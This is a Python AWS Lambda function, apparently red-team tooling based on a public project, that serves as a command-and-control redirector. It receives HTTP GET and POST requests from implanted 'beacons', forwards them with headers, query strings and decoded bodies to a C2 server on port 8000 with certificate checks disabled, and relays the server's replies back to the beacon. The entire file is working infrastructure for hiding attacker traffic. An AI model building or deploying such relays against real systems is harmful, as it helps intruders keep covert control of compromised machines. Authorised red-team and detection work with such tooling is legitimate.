#Inspired by: https://github.com/scottctaylor12/Red-Lambda/tree/main
import base64
import os
import requests
def redirector(event, context):
    #######
    # Forward HTTP request to C2
    #######
    # Setup forwarding URL

    redirect = os.getenv("LOADBLCIP")
    url = "http://" + redirect + ":8000" + event["requestContext"]["http"]["path"]
    
    # Parse Query String Parameters
    queryStrings = {}
    if "queryStringParameters" in event.keys():
        for key, value in event["queryStringParameters"].items():
            queryStrings[key] = value
    
    # Parse HTTP headers
    inboundHeaders = {}
    for key, value in event["headers"].items():
        inboundHeaders[key] = value
    
    # Handle potential base64 encodng of body
    body = ""
    if "body" in event.keys():
        if event["isBase64Encoded"]:
            body = base64.b64decode(event["body"])
        else:
            body = event["body"]
    
    print(f"Request done to {url} with data {body}")

    # Forward request to C2
    requests.packages.urllib3.disable_warnings() 
    
    if event["requestContext"]["http"]["method"] == "GET":
        resp = requests.get(url, headers=inboundHeaders, params=queryStrings, verify=False)
    elif event["requestContext"]["http"]["method"] == "POST":
        resp = requests.post(url, headers=inboundHeaders, params=queryStrings, data=body, verify=False)
    else:
        return "ERROR: INVALID REQUEST METHOD! Must be POST or GET"
    
    print(resp)

    ########
    # Return response to beacon
    ########
    # Parse outbound HTTP headers
    outboundHeaders = {}
    
    for head, val in resp.headers.items():
        outboundHeaders[head] = val
    
    # build response to beacon
    response = {
        "statusCode": resp.status_code,
        "body": resp.text,
        "headers": outboundHeaders
    }

    return response